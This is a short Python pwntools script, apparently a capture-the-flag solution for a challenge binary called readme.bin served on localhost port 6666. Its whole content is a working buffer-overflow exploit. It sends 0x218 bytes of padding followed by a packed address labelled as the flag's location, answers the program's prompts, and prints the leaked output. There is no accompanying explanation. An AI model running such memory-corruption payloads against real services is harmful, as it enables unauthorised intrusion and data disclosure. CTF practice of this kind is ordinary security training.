from pwn import *

addr_flag = 0x600d20

H,P = 'localhost', 6666

#r = process('./readme.bin')
r = remote(H,P)
junk  = r.recvuntil("What's your name? ")
exploit  = "A"*0x218
exploit += p64(addr_flag)
r.sendline(exploit)
junk += r.recvuntil("Please overwrite the flag: ")
r.sendline("Overwritten Flag")
junk += r.recvall()
print junk
